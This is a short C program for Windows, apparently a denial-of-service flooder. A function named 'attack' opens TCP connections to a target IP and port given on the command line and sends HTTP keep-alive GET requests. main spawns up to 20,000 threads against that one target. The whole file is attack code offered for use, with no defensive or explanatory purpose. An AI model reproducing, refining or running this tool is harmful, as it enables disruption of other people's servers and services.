#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <pthread.h>
#include <time.h>

#define MAXTH 20000

pthread_t threads[MAXTH];

struct alvo
{
	char *ip;
	int porta;
};

void *attack(void *arg)
{
	WSADATA ws;
	WSAStartup(MAKEWORD(2, 2), &ws);

	struct alvo *av1 = (struct alvo *) arg;

	char *ip = (char *) av1->ip;
	int porta = (int) av1->porta;

	char *req =
		"GET / HTTP/1.0\r\n"
		"Connection: keep-alive\r\n"
		"Host:\r\n\r\n";

	printf("%s %d", ip, porta);

	struct sockaddr_in alvo;

	alvo.sin_addr.s_addr = inet_addr(ip);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);

	int sTest;

	if ((sTest = socket(AF_INET, SOCK_STREAM, 0)) >= 0)
	{
		if (connect(sTest, (struct sockaddr *)&alvo, sizeof(alvo)) >= 0)
		{
			int meusocket = socket(AF_INET, SOCK_STREAM, 0);
			int conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof(alvo));
			send(meusocket, req, strlen(req), 0);
		}
		else
		{
			printf("Connect Error\n");
		}
	}
	else
	{
		printf("Socket Error\n");
	}
}

int main(int argc, char *argv[])
{
	int i, j;

	struct alvo av;

	av.ip = argv[1];
	av.porta = atoi(argv[2]);
	int tN = atoi(argv[3]);

	for (i = 0; i < tN; i++)
	{
		pthread_create(&(threads[i]), NULL, attack, &av);
		printf("Threads %d\n", i);
		Sleep(10);
	}

	return 0;
}
